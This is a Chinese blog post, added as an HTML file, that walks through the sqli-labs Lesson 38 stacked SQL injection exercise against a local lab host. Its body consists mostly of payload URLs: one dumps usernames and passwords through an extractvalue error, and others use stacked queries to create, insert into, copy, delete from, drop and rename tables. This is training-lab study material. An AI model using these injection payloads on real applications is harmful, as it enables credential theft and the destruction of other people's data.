@@ -1,0 +1,960 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#fff">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="https://fonts.loli.net/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.4.1" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/fish-32x32.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/fish-16x16.png?v=6.4.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.1" color="#fff">
+
+
+
+  <meta name="msapplication-config" content="/images/browserconfig.xml">
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.1',
+    sidebar: {"position":"right","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":true},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="sqli-labs lession-38 GET-堆叠注入 登录界面 分析     总的来说就是可以用;隔开多个sql语句来执行,但是这里有多个查询结果的话只能返回第一个查询的结果集。还可以建表添加用户的操作，但是没有回显就是了，这些操作是建立在了解注入的是数据库的数据结构的基础上的。 过程跟Lesson-1唯一的不同就是可执行多条sql语句了。检验注入漏洞。一般用于增删改。 http://192">
+<meta name="keywords" content="sqli-labs">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs lession-38 GET-堆叠注入">
+<meta property="og:url" content="https://yingyingguaier.github.io/2018/10/16/sqli-labs-lession-38-GET-堆叠注入/index.html">
+<meta property="og:site_name" content="0menc&#39;s Blog">
+<meta property="og:description" content="sqli-labs lession-38 GET-堆叠注入 登录界面 分析     总的来说就是可以用;隔开多个sql语句来执行,但是这里有多个查询结果的话只能返回第一个查询的结果集。还可以建表添加用户的操作，但是没有回显就是了，这些操作是建立在了解注入的是数据库的数据结构的基础上的。 过程跟Lesson-1唯一的不同就是可执行多条sql语句了。检验注入漏洞。一般用于增删改。 http://192">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-38/001.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-38/002.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-38/003.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-38/004.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-38/005.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-38/006.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-38/007.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-38/008.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-38/009.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-38/010.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-38/011.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-38/012.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-38/013.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-38/014.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-38/015.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-38/016.png">
+<meta property="og:updated_time" content="2019-06-19T17:23:13.392Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sqli-labs lession-38 GET-堆叠注入">
+<meta name="twitter:description" content="sqli-labs lession-38 GET-堆叠注入 登录界面 分析     总的来说就是可以用;隔开多个sql语句来执行,但是这里有多个查询结果的话只能返回第一个查询的结果集。还可以建表添加用户的操作，但是没有回显就是了，这些操作是建立在了解注入的是数据库的数据结构的基础上的。 过程跟Lesson-1唯一的不同就是可执行多条sql语句了。检验注入漏洞。一般用于增删改。 http://192">
+<meta name="twitter:image" content="https://yingyingguaier.github.io/img/sql/Lesson-38/001.png">
+
+
+
+
+
+
+  <link rel="canonical" href="https://yingyingguaier.github.io/2018/10/16/sqli-labs-lession-38-GET-堆叠注入/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>sqli-labs lession-38 GET-堆叠注入 | 0menc's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0menc's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">学习、踩坑及经验分享</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-commonweal">
+    <a href="/404.html" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>Commonweal 404</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://yingyingguaier.github.io/2018/10/16/sqli-labs-lession-38-GET-堆叠注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="嘤嘤怪er">
+      <meta itemprop="description" content="0menc">
+      <meta itemprop="image" content="/images/jack.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0menc's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sqli-labs lession-38 GET-堆叠注入
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-10-16 10:33:39" itemprop="dateCreated datePublished" datetime="2018-10-16T10:33:39+08:00">2018-10-16</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/sql注入/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="sqli-labs-lession-38-GET-堆叠注入"><a href="#sqli-labs-lession-38-GET-堆叠注入" class="headerlink" title="sqli-labs lession-38 GET-堆叠注入"></a>sqli-labs lession-38 GET-堆叠注入</h1><hr>
+<h2 id="登录界面"><a href="#登录界面" class="headerlink" title="登录界面"></a>登录界面</h2><p><img src="/img/sql/Lesson-38/001.png" alt="001"></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="/img/sql/Lesson-38/002.png" alt="002"></p>
+<p><img src="/img/sql/Lesson-38/003.png" alt="003"></p>
+<p><img src="/img/sql/Lesson-38/004.png" alt="004"></p>
+<p><img src="/img/sql/Lesson-38/005.png" alt="005"></p>
+<p><img src="/img/sql/Lesson-38/006.png" alt="006"></p>
+<p>总的来说就是可以用;隔开多个sql语句来执行,但是这里有多个查询结果的话只能返回第一个查询的结果集。还可以建表添加用户的操作，但是没有回显就是了，这些操作是建立在了解注入的是数据库的数据结构的基础上的。</p>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>跟Lesson-1唯一的不同就是可执行多条sql语句了。检验注入漏洞。一般用于增删改。</p>
+<p><code>http://192.168.75.132/sql/Less-38/?id=2&#39; and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23&#39;</code></p>
+<p><img src="/img/sql/Lesson-38/007.png" alt="007"></p>
+<h3 id="增"><a href="#增" class="headerlink" title="增"></a>增</h3><h4 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h4><p><code>http://192.168.75.132/sql/Less-38/?id=2&#39;;create table test like users;%23</code></p>
+<p><img src="/img/sql/Lesson-38/008.png" alt="008"></p>
+<h4 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h4><p><code>http://192.168.75.133/sql/Less-38/?id=-1&#39;union select 1,2,3;insert into test(id,username,password)values(100,&#39;zhao&#39;,&#39;zhao&#39;);%23</code></p>
+<p><img src="/img/sql/Lesson-38/009.png" alt="009"></p>
+<p><img src="/img/sql/Lesson-38/010.png" alt="010"></p>
+<p>还可以将结构相同的表数据插入。</p>
+<p><code>http://192.168.75.133/sql/Less-38/?id=-1&#39;union select 1,2,3;insert into test select * from users%23</code></p>
+<p><img src="/img/sql/Lesson-38/011.png" alt="011"></p>
+<p><img src="/img/sql/Lesson-38/012.png" alt="012"></p>
+<h3 id="删"><a href="#删" class="headerlink" title="删"></a>删</h3><h4 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h4><p><code>http://192.168.75.133/sql/Less-38/?id=-1&#39;union select 1,2,3;delete from test where id = 100%23</code></p>
+<p><img src="/img/sql/Lesson-38/013.png" alt="013"></p>
+<p><img src="/img/sql/Lesson-38/014.png" alt="014"></p>
+<h4 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h4><p><code>http://192.168.75.133/sql/Less-38/?id=-1&#39;union select 1,2,3;drop table user_test;%23</code></p>
+<h3 id="改"><a href="#改" class="headerlink" title="改"></a>改</h3><h4 id="修改表名"><a href="#修改表名" class="headerlink" title="修改表名"></a>修改表名</h4><p><code>http://192.168.75.133/sql/Less-38/?id=-1&#39;union select 1,2,3;alter table test rename to user_test;%23</code></p>
+<p><img src="/img/sql/Lesson-38/015.png" alt="015"></p>
+<p><img src="/img/sql/Lesson-38/016.png" alt="016"></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+<div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-heart"></i>感谢阅读-------------</div>
+    
+</div>
+  
+</div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sqli-labs/" rel="tag"># sqli-labs</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/10/18/sqli-labs-lession-39-GET-堆叠注入-整型/" rel="prev" title="sqli-labs lession-39 GET-堆叠注入-整型">
+                <i class="fa fa-chevron-left"></i> sqli-labs lession-39 GET-堆叠注入-整型
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/10/16/sqli-labs-lession-37-POST-绕过Mysql-real-escape-string/" rel="next" title="sqli-labs lession-37 POST-绕过Mysql-real-escape-string">
+                sqli-labs lession-37 POST-绕过Mysql-real-escape-string <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <a href="/">
+                <img class="site-author-image" itemprop="image" src="/images/jack.jpg" alt="嘤嘤怪er">
+              </a>
+            
+              <p class="site-author-name" itemprop="name">嘤嘤怪er</p>
+              <p class="site-description motion-element" itemprop="description">0menc</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">101</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">16</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sqli-labs-lession-38-GET-堆叠注入"><span class="nav-number">1.</span> <span class="nav-text">sqli-labs lession-38 GET-堆叠注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#登录界面"><span class="nav-number">1.1.</span> <span class="nav-text">登录界面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析"><span class="nav-number">1.2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#过程"><span class="nav-number">1.3.</span> <span class="nav-text">过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#增"><span class="nav-number">1.3.1.</span> <span class="nav-text">增</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#创建表"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">创建表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#插入数据"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">插入数据</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#删"><span class="nav-number">1.3.2.</span> <span class="nav-text">删</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#删除数据"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">删除数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#删除表"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">删除表</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#改"><span class="nav-number">1.3.3.</span> <span class="nav-text">改</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#修改表名"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">修改表名</span></a></li></ol></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">嘤嘤怪er</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+<script type="text/javascript">
+
+    var a_idx = 0;
+    jQuery(document).ready(function($) {
+        $("body").click(function(e) {
+            var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正" ,"法治", "爱国", "敬业", "诚信", "友善");
+            var $i = $("<span />").text(a[a_idx]);
+            a_idx = (a_idx + 1) % a.length;
+            var x = e.pageX,
+                y = e.pageY;
+            $i.css({
+                "z-index": 99999999999999999999999999999999999999999999999999999999999999999999999999 ,
+                "top": y - 20,
+                "left": x,
+                "position": "absolute",
+                "font-weight": "bold",
+                "color": "#ff6651"
+            });
+            $("body").append($i);
+            $i.animate({
+                    "top": y - 180,
+                    "opacity": 0
+                },
+                1500,
+                function() {
+                    $i.remove();
+                });
+        });
+    });
+</script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300,"bottom":-40},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
